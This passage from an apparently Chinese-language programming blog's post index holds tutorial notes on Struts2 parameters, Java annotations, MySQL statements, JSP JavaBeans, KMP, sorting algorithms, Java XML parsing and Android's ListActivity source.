//getter和setter方法，重要！Struts2是通过反射完成的！&#125;public class MyAction extends ActionSupport&#123; private User user; public String execute() throws Exception&#123; System.out.println(user.getUsername()+":"+user.getPassword()); return SUCCESS; &#125; //getter和setter方法，重要！Struts2是通过反射完成的！&#125; 实现ModelDriven接口接收参数123456&lt;!--表单loginJSP.jsp--&gt;&lt;form action="myAction" method="post"&gt; &lt;input type="text" name="username"/&gt;&lt;!--不用指定对象名--&gt; &lt;input type="password" name="password" /&gt;&lt;!--不用指定对象名--&gt; &lt;input type="submit" value="提交" /&gt;&lt;/form&gt; 12345678910111213141516public class User&#123; private String username; private String password; //getter和setter方法，重要！Struts2是通过反射完成的！&#125;public class MyAction extends ActionSupport implements ModelDriven&lt;User&gt;&#123; private User user = new User(); public String execute() throws Exception&#123; System.out.println(user.getUsername()+":"+user.getPassword()); return SUCCESS; &#125; //去掉getter和setter方法，需自己new User public User getModel()&#123; return user; &#125;&#125;]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[自定义Annotation学习笔记]]></title>
    <url>%2Fposts%2Fhow_to_custom_annotation.html</url>
    <content type="text"><![CDATA[JDK元注解对注解使用的注解又称为元注解。 @RetentionRetention意思是保留，声明这个注解的生存时间，包含了一个RetentionPolicy的枚举类的value成员变量。 123456@Documented//1.3节知识@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.ANNOTATION_TYPE)//1.2节知识public @interface Retention &#123; RetentionPolicy value();&#125; RetentionPolicy枚举 说明 CLASS 将Annotation记录在class文件中，运行时抛弃，这是默认值 RUNTIME 将Annotation记录在class文件中，运行时保留，可以使用反射 SOURCE 只将Annotation记录在java源代码中，用于编译提示报错 @TargetTarget意思是目标，表示这个注解可以用于类、方法、Field等不同地方。可以看到value是一个ElementType枚举类的数组，即可以接收多个参数。123456@Documented//1.3节知识@Retention(RetentionPolicy.RUNTIME)//1.1节知识@Target(ElementType.ANNOTATION_TYPE)public @interface Target &#123; ElementType[] value();&#125; ElementType枚举 修饰范围 ANNOTATION_TYPE 注解Annotation PACKAGE 包 TYPE 类、接口、注释、枚举 CONSTRUCTOR 类构造器 METHOD 方法 FIELD 成员变量 LOCAL_VARIABLE 局部变量 PARAMETER 形式参数 @DocumentedDocumented意思是文档，修饰的Annotation将被javadoc提取成文档12345@Documented@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.ANNOTATION_TYPE)public @interface Documented &#123;&#125; @InheritedInherited意思是遗传，修饰的Annotation所修饰的类将具有继承性。即如果A注解被@Inherited修饰，那么被A注解修饰的B类的子类C类将默认被A注解修饰。12345@Documented@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.ANNOTATION_TYPE)public @interface Inherited &#123;&#125; 自定义Annotation有了元注解，就可以自定义注解 声明和普通的类、接口声明一样，使用@interface关键字即可。还可以添加成员变量(以方法的形式)，指定默认值。123456@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.METHOD)public @interface MyAnnotation&#123; String name(); int age() default 20;&#125; 获取注解信息12345678910111213141516171819202122public class Main &#123; @MyAnnotation(name = "小明") public static void main(String[] args) &#123; Test.test(Main.class); &#125; @MyAnnotation(name = "小行", age=12) public void test1()&#123; &#125;&#125;public class Test &#123; @MyAnnotation(name="小明", age = 21) public static void test(Class c)&#123; for(Method m : c.getMethods())&#123; for(Annotation a : m.getAnnotations())&#123; if(a instanceof MyAnnotation)&#123; MyAnnotation ma = (MyAnnotation) a; System.out.println(m.getName()+":"+ma.name()+","+ma.age()); &#125; &#125; &#125; &#125;&#125;]]></content>
      <categories>
        <category>Java SE</category>
      </categories>
      <tags>
        <tag>Annotation</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL常用语句]]></title>
    <url>%2Fposts%2Fcommon_MySQL_command.html</url>
    <content type="text"><![CDATA[简介本文记录常用MySQL语句 用户权限12345678910111213141516# 创建用户create user user_name@ip_address identified by 'password'; # 用户通过指定ip地址登录 create user user_name@'%' identified by 'password'; # 用户通过任意ip地址登录 # 删除用户drop user user1@localhost; # 删除用户user1# 用户授权grant create,alter,drop,insert,update,delete,select on mydb.* to user1@localhost; # 分配mydb所有表的指定权限给user1grant all on mydb.* to user2@localhost; # 分配mydb数据库所有表的所有权限给user2# 撤销权限revoke create on mydb.* from user1@localhost; # 撤销user1对mydb所有表的create权限 # 查看权限show grants for user1@localhost; # 查看user1的权限 数据库12345678# 创建数据库create database [if not exists] db_name [charset=utf8];# 删除数据库drop database [if exists] db_name;# 修改数据库编码alter database db_name character set utf8 表123456789101112131415161718192021222324252627282930313233343536373839# 常用建表create table [模式名.]表名( /* 可以有多个列定义 */ /* 列名 数据类型 [列级约束] */ columnName1 datatype [default expr])# 子查询建表create table [模式名.]表名assubquery # 如 select * from 表# 修改表结构## 表改名alter table 表名 rename to 新表名## 添加列## 新增列不可指定非空约束，除非有默认约束alter table 表名add( /* 可以有多个列定义 */ /* 列名 数据类型 [列级约束] */ columnName1 datatype [default expr])## 修改列## modify一次只能修改一列alter table 表名 modify 列名 [新列名] 数据类型 [default expr] [first|after 列名]## 删除列alter table 表名 drop 列名# 删除表, 表数据、约束、索引也被删除drop table 表名# 清空数据，保留表结构truncate 表名 索引索引是存放在模式中的一个数据库对象，在数据字典中独立存放，属于某个表，作用是加速对表的查询。 创建的两种方式 自动：当在表上定义主键约束、唯一约束、外键约束时，会自动创建 手动：通过create index index_name on table_name(column[,column]...)语句创建 删除的两种方式 自动：数据表被删除时，该表的索引被删除 手动：通过drop index index_name on table_name语句删除 插入更新删除123456789101112131415# 插入insert into table_name [ ( column [, column...] ) ]values ( value [, value...]);# 使用子查询插入数据，要求插入数据列和数据类型匹配insert into table_name [ ( column [, column...] ) ]subquery# 更新update table_nameset column1 = value1 [ , column2 = value2 ]...[where condition];# 删除delete from table_name [where condition]; 查询单表查询12345678910111213141516171819202122232425# 查找不重复姓名的学生信息select distinct sname from stu;# not取反select * from sname where not sid=2; # 查找sid不等于2的学生信息# between...and之间select * from stu where sid between 2 and 4; # 查找学号在[2,4]区间中的学生信息# in集合select * from stu where sid in (2, 3, 4); # 查找学号在(2, 3, 4)集合中的学生信息# like模糊查询select * from stu where sname like '张_'; # 查找姓名为两个字开头为张的学生信息 select * from stu where sname like '张%'; # 查找姓名为张开头的学生信息 select * from stu where sname like '张\%'; # 查找姓名为张%的学生信息，转义字符，标准SQL中没有转义字符 select * from stu where sname like '张\%' escape '\'; #'# 标准SQL使用escape声明转义字符# limit限制查询数量select * froom stu limit 0, 5; # 查询stu表中从第0行开始的5条记录 # 外连接查询select s.*,t.* from stu s left outer join teacher t on s.tid=t.tid; # 左外连接，左表为基础，右表数据可为null select s.*,t.* from stu s right outer join teacher t on s.tid=t.tid; # 右外连接，右表为基础，左表数据可为null select s.*,t.* from stu s full outer join teacher t on s.tid=t.tid; # 全外连接，MySQL不支持 约束不得使用外键与级联, 一切外键概念必须在应用层解决。外键与级联更新适用于单机低并发, 不适合分布式、高并发集群;级联更新是强阻塞, 存在数据库更新风暴的风险;外键影响数据库的插入速度。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071# not null约束# 非空约束，确保指定列不为空，只能作为列级约束。create table stu ( sid int not null ); /* 建表时指定非空约束 */alter table stu modify sid int not null; /* 修改表时指定非空约束 */alter table stu modify sid int null; /* 修改表时取消非空约束 */# unique约束# 唯一约束，确保指定列或多列组合不允许出现重复值，可作为表级约束和列级约束。# 多列唯一约束只能用表级约束语法。# 创建唯一约束时，`MySQL`会对应创建唯一索引，默认与列名相同。create table stu ( sid int unique ); /* 建表时指定列级唯一约束 */create table stu ( sid int, /* 使用表级约束语法建立唯一约束 */ unique (sid), /* 使用表级约束语法建立唯一约束并指定约束名 */ /* constraint uk_1 unique (sid), */)alter table stu add unique(sid); /* 修改表结构增加唯一约束 */alter table stu modify sid int unique; /* 修改表结构增加唯一约束 */alter table stu drop index 约束名; /* 修改表结构删除唯一约束 */# primary key约束# 主键约束=非空约束+唯一约束，唯一标识一条记录，可作为表级约束和列级约束。# 多列主键约束只能用表级约束语法。# 可以为主键约束指定约束名，但没有用，最后`MySQL`都改为`PRIMARY`。# 还可以设置为自增长`auto_increment`create table stu ( sid int primary key auto_increment ); /* 建表时指定列级主键约束 */create table stu ( sid int, /* 使用表级约束语法建立主键约束 */ primary key ( sid ), /* 使用表级约束语法建立主键约束并指定约束名，对MySQL无效，最后都为PRIMARY */ /* constraint pk_1 primary key ( sid ) */)alter table stu add primary key(sid); /* 修改表结构增加主键约束 */alter table stu modify sid int primary key; /* 修改表结构增加主键约束 */alter table stu drop primary key; /* 修改表结构删除主键约束 */# foreign key约束# 外键确保了两个表之间的参照完整性。MySQL只支持表级约束# on delete cascade ：级联删除，删除所有表的相关的记录# on delete set null：置空删除，将所有表的相关记录的对应字段置nullcreate table stu ( sid int unsigned primary key auto_increment, /* 列级约束，MySQL支持，但不生效 */ /* tid int reference teacher(tid) # stu.tid参照teacher.tid */ tid int, /* 使用表级约束建立外键约束，默认为 表名_ibfk_n，n是从1开始的整数 */ foreign key (tid) references teacher(tid) on delete set null /* 使用表级约束建立外键约束并指定约束名stu_tea_fk */ /* constraint stu_tea_fk foreign key (tid) references teacher(tid) */)/* 修改表结构增加外键约束 */alter table stu add foreign key (tid) references teacher(tid); /* 删除外键约束 */alter table drop foreign key 约束名; # check约束`MySQL`无效create table stu( sid int, age int, check(age&gt;0)) 函数字符函数 名称 描述 concat(var… args) 将所有字符串连接成一个字符串 concat_ws(var delimiter, var… args) 将所有字符串连接成一个字符串，子串之间用delimiter分割 format(var num, var decimal) 将数字格式化，四舍五入保留decimal位小数 lower(var str) 将所有字符转化为小写 upper(var str) 将所有字符转化为大写 left(var str, var left) 取字符串前left个字符 right(var str, var right) 取字符串后right个字符 length(var str) 计算字符串的长度 ltrim(var str) 删除字符串前导空格 rtrim(var str) 删除字符串后续空格 trim(var str) 删除字符串前导和后续空格，不能删除中间空格 substring(var str, var start, var length) 截取字符串从start个字符开始长度为length的字符start负值为倒数，length默认全部 replace(var str, var old, var new) 将字符串中的old字符串替换为new字符串 数值运算函数 名称 描述 ceil(var num) 向上取整，2.6得3，2.1得3 div 整数除法，4/3==1，select 4 div 3; floor() 向下取整，2.6得2，2.1得2 mod 取余数，5%3==2，select 5 mod 3; power(var base, var exponent) 幂运算，2^3==8 round(var num, var decimal) 四舍五入保留decimal位小数，默认保留整数 truncate(var num, var decimal) 不四舍五入，直接截断保留decimal位小数，负数往前截断 日期时间函数 名称 描述 now() 当前的日期和时间，2016-12-20 17:08:31 curdate() 当前日期，2016-12-20 curtime() 当前时间，17:08:31 date_add(var now, interval var datetime) 日期增减(正负)datetime单位时间，select date_add(‘2016-12-20’,interval 3 day) datediff(var now, var diff) 计算now-diff的时间差，以天为单位 date_format(var now, var format) 日期格式转换为format格式select date_format(now(),’%Y年%m月%d日%H时%i分%s秒’); 数据库信息函数 名称 描述 connection_id() 连接ID database() 当前数据库名称 last_insert_id() 最后插入的记录的ID user() 当前用户和地址 version() 版本号 加密函数 名称 描述 md5(var msg) 信息摘要算法加密 password(var msg) 密码算法加密 自定义函数1234567891011121314151617181920# 删除函数drop function 函数名;# 创建无参函数create function now_cn() returns varchar(30)return date_format(now(), '%Y年%m月%d日 %H时%i分%s秒');# 创建有参函数create function avg(num1 int, num2 int) returns float(10,2)return (num1+num2)/2;# 创建复合结构函数体的函数# 首先以`//`为结尾，替换;# 再在`begin`和`end`之间编写函数体delimiter //create function adduser(user_name varchar(30)) returns intbegininsert into user(username) values(user_name);return last_insert_id();end// 集合运算1234567891011# union并运算# 查找名字为张三的学生和年龄大于10的学生的并集select * from stu where sname='张三' union select * from stu where age&gt;10;# minus减运算# 查找年龄大于15但不大于20的学生的集合select * from stu where age&gt;15 minus select * from stu where age&gt;20 select * from stu where age&gt;15 and age not in (select age from stu where age&gt;20);# intersect交运算# MySQL不支持，可用多表连接查询实现 视图视图可以看成是一个依赖一个或多个表的只读表12345678# 创建create or replace view view_nameassubquerywith check option /* 指定不允许修改该视图的数据 */# 删除drop view view_name 事务 原子性（Atomicity）：是应用的最小执行单位，不可再分。 一致性（Consistency）：事务执行结果使数据库从一个一致性状态变为另一个一致性状态，通过原子性实现。 隔离性（Isolation）：各个事务相互独立互不干扰。 持续性（Durability）：事务一旦提交，所有更改都记录到永久存储器中。1234567891011121314begin; # 临时开启事务 # start transaction; # 临时开启事务 insert into stu(sname) values("stu1");insert into stu(sname) values("stu2");# savepoint a; # 设置事务中间点 insert into stu(sname) values("stu3");select * from stu; # 三条插入数据显示rollback; # 回滚事务 # rollback to a; # 回滚到之前声明的事务中间点a # commit; # 或者显式提交事务 select * from stu; # 三条插入数据没有插入，回滚事务 存储过程(开发不建议使用)存储过程是SQL语句和控制语句的预编译集合，减少了语法分析和编译的过程，提高执行效率。存储过程难以调试和扩展，更没有移植性。 参数类型： IN：表示该参数的值必须在调用存储过程时指定 OUT：表示该参数的值可以被存储过程改变，并且可以返回 INOUT：表示该参数的调用时指定，并且可以被改变和返回 123456789101112131415161718192021# 删除存储过程drop procedure 存储过程名;drop procedure if exists 存储过程名;# 创建无参存储过程create procedure pd_get_version()select version();# 创建有参存储过程delimiter //create procedure pd_adduser(IN user_name varchar(20), OUT all_nums int)begininsert into user(username) values(user_name);select count(*) from user into all_nums;end//delimiter ;# 使用存储过程call 存储过程名(变量...);call pd_adduser('Tom', @nums);select @nums;]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSP的Java Bean学习总结]]></title>
    <url>%2Fposts%2FThe_Java_Bean_of_JSP.html</url>
    <content type="text"><![CDATA[使用预先创建Person类12345public class Person()&#123; string name; int age; //get方法、set方法、构造方法&#125; 普通方式使用并在JSP中使用，就像Java程序一样12345678&lt;@page import="包名.Person"&gt;&lt;%--先导包--%&gt;&lt;html&gt;&lt;head&gt;&lt;%--省略--%&gt;&lt;/head&gt;&lt;body&gt; &lt;% Person p1 = new Person("小明",12); out.println("姓名:"+p1.getName()+"，年龄:"+p1.getAge()); %&gt;&lt;/body&gt;&lt;/html&gt; 通过JSP动作标签使用使用&lt;jsp:useBean&gt;声明，&lt;jsp:setProperty&gt;设置属性，使用&lt;jsp:getProperty&gt;获取属性并且不用&lt;@page import=&quot;&quot;&gt;导包 首先新建个submit.jsp页面，写一个form表单123456789&lt;html&gt;&lt;head&gt;&lt;%--省略--%&gt;&lt;/head&gt;&lt;body&gt; &lt;form name="submitForm" action="doSubmit.jsp" method="post"&gt; &lt;input type="text" name="name"/&gt;&lt;br/&gt; &lt;input type="text" name="age"/&gt;&lt;br/&gt; &lt;input type="submit" value="提交"/&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 然后在doSubmit.jsp页面中获取form中传递的数据12345678910111213141516171819202122232425&lt;html&gt;&lt;head&gt;&lt;%--省略--%&gt;&lt;/head&gt;&lt;body&gt; &lt;jsp:useBean id="p2" class="包名.Person" scope="作用范围" /&gt;&lt;%--相当于Person p2 = new Person();--%&gt; &lt;%--scope默认值是page，可选page、request、session、application--%&gt; &lt;jsp:setProperty name="p2" property="*" /&gt;&lt;%--第一种方法--%&gt; &lt;%--通配符*会自动将form中的name和JavaBean中的属性自动配对--%&gt; &lt;jsp:getProperty name="p2" property="name" /&gt;&lt;%--相当于p2.getName()--%&gt; &lt;jsp:getProperty name="p2" property="age" /&gt;&lt;%--相当于p2.getAge()--%&gt; &lt;jsp:setProperty name="p2" property="name" /&gt;&lt;%--第二种方法--%&gt; &lt;jsp:setProperty name="p2" property="age" /&gt;&lt;%--将form中的name和JavaBean中的属性自动配对--%&gt; &lt;jsp:getProperty name="p2" property="name" /&gt;&lt;%--相当于p2.getName()--%&gt; &lt;jsp:getProperty name="p2" property="age" /&gt;&lt;%--相当于p2.getAge()--%&gt; &lt;jsp:setProperty name="p2" property="name" value="小红" /&gt;&lt;%--第三种方法--%&gt; &lt;jsp:setProperty name="p2" property="age" value="10" /&gt;&lt;%--手动设置属性--%&gt; &lt;jsp:getProperty name="p2" property="name" /&gt;&lt;%--相当于p2.getName()--%&gt; &lt;jsp:getProperty name="p2" property="age" /&gt;&lt;%--相当于p2.getAge()--%&gt; &lt;jsp:setProperty name="p2" property="name" param="name" /&gt;&lt;%--第四种方法--%&gt; &lt;jsp:setProperty name="p2" property="age" param="age"/&gt;&lt;%--通过request获取传递参数--%&gt; &lt;jsp:getProperty name="p2" property="name" /&gt;&lt;%--相当于p2.getName()--%&gt; &lt;jsp:getProperty name="p2" property="age" /&gt;&lt;%--相当于p2.getAge()--%&gt;&lt;/body&gt;&lt;/html&gt; 总结使用普通方式和Java程序一样。使用jsp:setProperty标签 运用通配符*实现完全匹配，表单form的name属性名、JavaBean的属性名要完全一致。 运用通配符*实现部分匹配，表单form的name属性名、JavaBean的属性名、jsp:setProperty的property属性值要完全一致。 手动设置，和表单form无关，和普通方式使用情景一样。 从request中获取，param的属性值只要和request的属性值一致即可，不用和JavaBean的属性值保持一致，无论get、post都可以。]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>JSP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[KMP算法]]></title>
    <url>%2Fposts%2FKMP_Algorithm.html</url>
    <content type="text"><![CDATA[前言KMP是一种字符串匹配算法，并不算高效，晦涩难懂，比它简单易懂高效的算法是有，但不知为何，课本只讲了这种字符串匹配算法。整个算法的精髓就在于next数组的计算，网上关于KMP的资料有很多。这里只讲next数组的计算。 求P＝{ababbaaba}的next数组1、首先，给前两个赋值0112ababbaaba01 2、下标移到3号位，对应下标为a，前缀为a，后缀为b，没有相同的，赋1123 ↓ababbaaba011 3、下标移到4号位，对应下标为b，前缀为a、ab，后缀为ba、a有相同的a，长度为1，赋2123 ↓ababbaaba0112 4、下标移到5号位，对应下标为b，前缀为a、ab、aba，后缀为bab、ab、b有相同的ab，长度为2，赋3123 ↓ababbaaba01123 5、下标移到6号位，对应下标为a，前缀为a、ab、aba、abab，后缀为babb、abb、bb、b没有相同的，赋1123 ↓ababbaaba011231 6、下标移到7号位，对应下标为a，前缀为a、ab、aba、abab、ababb，后缀为babba、abba、bba、ba、a有相同的a，长度为1，赋2123 ↓ababbaaba0112312 7、下标移到8号位，对应下标为b，前缀为a、ab、aba、abab、ababb、ababba，后缀为babbaa、abbaa、bbaa、baa、aa、a有相同的a，长度为1，赋2123 ↓ababbaaba01123122 8、下标移到9号位，对应下标为a，前缀为a、ab、aba、abab、ababb、ababba、ababbaa，后缀为babbaab、abbaab、bbaab、baab、aab、ab、b有相同的ab，长度为2，赋3123 ↓ababbaaba011231223]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[排序算法]]></title>
    <url>%2Fposts%2FSorting_Algorithm.html</url>
    <content type="text"><![CDATA[排序算法 冒泡排序分析比较从0到arr.length的每一对数字，如果前一个数字大于（或小于）后一个数字，则交换位置，这样外层for循环每执行一次就把数组中的最大（小）数，移动到数组的最后。所以在内层for循环中可以不用比较已经排好序的数字，即arr.length-i之后的数字。时间复杂度为O(n^2) 代码 伪代码 123456789function bubble_sort (array, length) &#123; var i, j; for(i from 0 to length-1)&#123; for(j from 0 to length-1-i)&#123; if (array[j] &gt; array[j+1]) swap(array[j], array[j+1]) &#125; &#125;&#125; Java代码 123456789101112131415161718192021222324public class 冒泡排序 &#123; public static void main(String[] args) &#123; Scanner in = new Scanner(System.in); int n = in.nextInt(); int[] arr = new int[n]; for(int i = 0; i &lt; arr.length; i++)&#123; arr[i] = in.nextInt(); &#125; for(int i = 0; i &lt; arr.length-1; i++)&#123; for(int j = 0; j &lt; arr.length-1-i; j++)&#123; if(arr[j]&gt;arr[j+1])&#123; int temp = arr[j+1]; arr[j+1] = arr[j]; arr[j] = temp; &#125; &#125; for(int j = 0; j &lt; arr.length; j++)&#123; System.out.print(arr[j]+" "); &#125; System.out.println(""); &#125; &#125;&#125; 打印结果输入12108 100 50 22 15 6 1 1000 999 0 输出1234567898 50 22 15 6 1 100 999 0 1000 8 22 15 6 1 50 100 0 999 1000 8 15 6 1 22 50 0 100 999 1000 8 6 1 15 22 0 50 100 999 1000 6 1 8 15 0 22 50 100 999 1000 1 6 8 0 15 22 50 100 999 1000 1 6 0 8 15 22 50 100 999 1000 1 0 6 8 15 22 50 100 999 1000 0 1 6 8 15 22 50 100 999 1000 直接插入排序分析有一个数组[89, 27, 35, 78, 41, 15]，分为已经排好序的部分[89]和未进行排序的部分[27, 35, 78, 41, 15]然后取出27，与排好序的部分从后往前比较，找到适合27的位置0把排好序的数组的位置0之后的部分数组往后移一位，将27填入位置0中，完成一次插入排序。其他依次类推 代码 伪代码 12345678function bubble_sort (array, length) &#123; var i, j; for(i from 0 to length-1)&#123; for(j from length-1 to 0) if(array[j] &lt;= array[j+1]) break; swap(array[j], array[j+1]); &#125;&#125; Java代码 123456789101112131415161718192021public class 插入排序 &#123; public static void main(String[] args) &#123; Scanner in = new Scanner(System.in); int n = in.nextInt(); int[] arr = new int[n]; for(int i = 0; i &lt; arr.length; i++)&#123; arr[i] = in.nextInt(); &#125; for(int i = 1; i &lt; arr.length; i++)&#123; for(int j = i-1; j&gt;=0 &amp;&amp; arr[j]&gt;arr[j+1]; j--)&#123; int temp = arr[j]; arr[j] = arr[j+1]; arr[j+1] = temp; &#125; for(int i = 0; i &lt; arr.length; i++)&#123; System.out.print(arr[i]+" "); &#125; System.out.println("");&#125; &#125; &#125;&#125; 打印结果输入12689 27 35 78 41 15 输出1234527 89 35 78 41 15 27 35 89 78 41 15 27 35 78 89 41 15 27 35 41 78 89 15 15 27 35 41 78 89 快速排序分析从小到大排序，标记最左边的数为key,然后从右往左找比key小的数，再从左往右找比key大的数，交换位置，最后左右扫描到同一个位置时结束，二分，对左子数组和右子数组进行下一轮排序。 代码 伪代码 1234567891011121314function quick_sort (array, left, right) &#123; var l = left; var r = right; var key = array[left]; while(l&lt;r)&#123; while(l&lt;r &amp;&amp; array[r]&gt;=key) r--;//必须先从右开始 while(l&lt;r &amp;&amp; array[l]&lt;=key) l++; if(l&lt;r) swap(arr[l], arr[r]); &#125; array[left] = array[l];//交换终点值和key的位置 array[l] = key; quick_sort(arr, l+1, right);//二分排序，顺序不重要 quick_sort(arr, left, l-1);&#125; Java代码 1234567891011121314151617181920212223242526272829303132333435363738public class Main&#123; public static void main(String[] args) throws Exception &#123; Scanner in = new Scanner(System.in); int n = in.nextInt(); int[] arr = new int[n]; for(int i = 0; i &lt; arr.length; i++)&#123; arr[i] = in.nextInt(); &#125; quickSort(arr, 0, arr.length-1); printf(arr); &#125; private static void quickSort(int[] arr, int left, int right) &#123; if(left&gt;right) return; int l = left; int r = right; int key = arr[left]; while(l&lt;r)&#123; while(l&lt;r &amp;&amp; arr[r]&gt;=key) r--; while(l&lt;r &amp;&amp; arr[l]&lt;=key) l++; if(l&lt;r)&#123; int temp = arr[l]; arr[l] = arr[r]; arr[r] = temp; &#125; printf(arr); &#125; arr[left] = arr[l]; arr[l] = key; quickSort(arr, l+1, right); quickSort(arr, left, l-1); &#125; private static void printf(int[] arr)&#123; for(int i = 0; i &lt; arr.length; i++)&#123; System.out.print(arr[i]+" "); &#125; System.out.println(""); &#125;&#125; 打印结果输入12106 1 2 7 9 3 4 5 10 8 输出123456789106 1 2 5 9 3 4 7 10 8 6 1 2 5 4 3 9 7 10 8 6 1 2 5 4 3 9 7 10 8 3 1 2 5 4 6 9 7 8 10 3 1 2 5 4 6 9 7 8 10 3 1 2 5 4 6 8 7 9 10 3 1 2 5 4 6 7 8 9 10 2 1 3 5 4 6 7 8 9 10 2 1 3 4 5 6 7 8 9 10 1 2 3 4 5 6 7 8 9 10 参考资料:白话经典算法系列之二 直接插入排序的三种实现]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java解析XML]]></title>
    <url>%2Fposts%2FJava_parsing_XML.html</url>
    <content type="text"><![CDATA[前言 XML语法详解 定义一个xml文档 12345&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;store&gt; &lt;book id="01"&gt;第一本书&lt;/book&gt; &lt;book id="02"&gt;第二本书&lt;/book&gt;&lt;/store&gt; 原生解析DOM解析 优点：容易实现增删改操作 缺点：xml过大时容易造成内存溢出 Document API文档 和js中的类似 1234567891011121314151617181920212223public static void main(String[] args) throws Exception&#123; String filePath = "./src/main/resources/1.xml"; DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); DocumentBuilder builder = factory.newDocumentBuilder(); Document doc = builder.parse(filePath); NodeList books = doc.getElementsByTagName("book"); // 根据标签名获取标签 for (int i = 0; i &lt; books.getLength(); i++) &#123; Node book = books.item(i); NamedNodeMap attr= book.getAttributes(); System.out.println(i+"i:"+book.getTextContent()); // 输出book标签的文本内容 for(int j = 0; j &lt; attr.getLength(); j++)&#123; System.out.println(j+"j:"+attr.item(j)); // 输出book标签的所有属性值 &#125; &#125; // 添加一个标签 Element newBook = doc.createElement("book"); newBook.setAttribute("id", books.getLength()+1+""); // 设置属性 doc.getElementsByTagName("store").item(0).appendChild(newBook); // 添加到内存document中，此时未写入磁盘 TransformerFactory tffactory = TransformerFactory.newInstance(); Transformer tf = tffactory.newTransformer(); tf.transform(new DOMSource(doc), new StreamResult(filePath)); // 将document通过流的形式写入磁盘&#125; SAX解析 优点：不会造成内存溢出，适合查询 缺点：不能进行增删改操作 12345678910111213141516171819202122@Testpublic void testSAX() throws ParserConfigurationException, SAXException, IOException &#123; SAXParserFactory factory = SAXParserFactory.newInstance(); SAXParser parser = factory.newSAXParser(); parser.parse(new File(filePath), new DefaultHandler()&#123; @Override public void startElement(String uri, String localName,String qName,Attributes attributes) throws SAXException&#123; System.out.print("&lt;"+qName+"&gt;"); // 开始标签 &#125; @Override public void characters(char[] ch, int start, int length) throws SAXException &#123; System.out.print(new String(ch, start, length)); // 标签内容 &#125; @Override public void endElement(String uri, String localName, String qName) throws SAXException &#123; System.out.println("&lt;/"+qName+"&gt;"); // 结束标签 &#125; &#125;);&#125; dom4j解析导入maven项目 12345&lt;dependency&gt; &lt;groupId&gt;dom4j&lt;/groupId&gt; &lt;artifactId&gt;dom4j&lt;/artifactId&gt; &lt;version&gt;1.6.1&lt;/version&gt;&lt;/dependency&gt; 使用方法1234567891011121314151617181920212223@Testpublic void testDOM4J() throws DocumentException, IOException &#123; SAXReader reader = new SAXReader(); Document doc = reader.read(new File(filePath)); Element root = doc.getRootElement(); List&lt;Element&gt; books = root.elements("book"); for(Element book : books)&#123; List&lt;Element&gt; names = book.elements("name"); System.out.print("bookID:"+book.attributeValue("id")); for(Element name : names)&#123; System.out.println(name.getText()); &#125; &#125; //写入操作 Element newBook = root.addElement("book"); newBook.addAttribute("id", books.size()+1+""); // 添加属性 newBook.addElement("name").setText("第"+(books.size()+1)+"本书"); // 添加元素 XMLWriter writer = new XMLWriter(new FileOutputStream(new File(filePath)), // 流 OutputFormat.createPrettyPrint()); // 格式化写入 writer.write(doc); writer.close();&#125; 支持xpath导入maven项目 12345&lt;dependency&gt; &lt;groupId&gt;jaxen&lt;/groupId&gt; &lt;artifactId&gt;jaxen&lt;/artifactId&gt; &lt;version&gt;1.1.6&lt;/version&gt;&lt;/dependency&gt; 使用 123456789101112131415161718/*//book 所有book标签/store/book/name 所有store标签下的book标签下的name标签/* 所有标签，通配符/store/book[1]/name[last()] store标签下的第一个book标签下的最后一个name标签//book[@id] 所有有id属性的book标签//book[@id='01'] 所有id属性值为01的book标签*/@Testpublic void testXPath() throws DocumentException &#123; SAXReader reader = new SAXReader(); Document doc = reader.read(new File(filePath)); XPath xPath = new DefaultXPath("//name"); List&lt;Element&gt; names = xPath.selectNodes(doc); for (Element name : names) &#123; System.out.println(name.getTextTrim()); &#125;&#125;]]></content>
      <categories>
        <category>Java SE</category>
      </categories>
      <tags>
        <tag>XML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ListActivity源码详解]]></title>
    <url>%2Fposts%2FListActivity_source_code.html</url>
    <content type="text"><![CDATA[前言最近在研究PreferenceActivity发现是继承自ListActivity的，打开看了下ListActivity的源码，发现也不长，就详细阅读认识一下。 正文ListActivity简单到只要在onCreate()中调用setListAdapter()方法就可以实现了。支持空数据显示。 点进去我们看到前两个field很熟悉，就是一个ListView+Adapter。很容易就知道这两个field就是ListActivity的核心，数据存储在Adapter中，展示在ListView中。1234567891011protected ListAdapter mAdapter;protected ListView mList;/** 省略部分代码 */public void setListAdapter(ListAdapter adapter) &#123; //加上锁，防止多个线程同时调用这个方法 synchronized (this) &#123; ensureList();//内含setContentView的方法 mAdapter = adapter; mList.setAdapter(adapter); &#125;&#125; 在调用了setListAdapter()之后，对Adapter重新赋值，并重新设置ListView的Adapter，并且调用了ensureList()方法，重新创建布局。点进ensureList()方法。123456private void ensureList() &#123; if (mList != null) &#123; return; &#125; setContentView(com.android.internal.R.layout.list_content_simple);&#125; 哈！原来每次setListAdapter()都会把Adapter替换掉，并且重新setContentView()，怪不得ListActivity不用我们操心布局。我们再来看看这个布局的内容123456&lt;ListView xmlns:android="http://schemas.android.com/apk/res/android" android:id="@android:id/list" android:layout_width="match_parent" android:layout_height="match_parent" android:drawSelectorOnTop="false" /&gt; 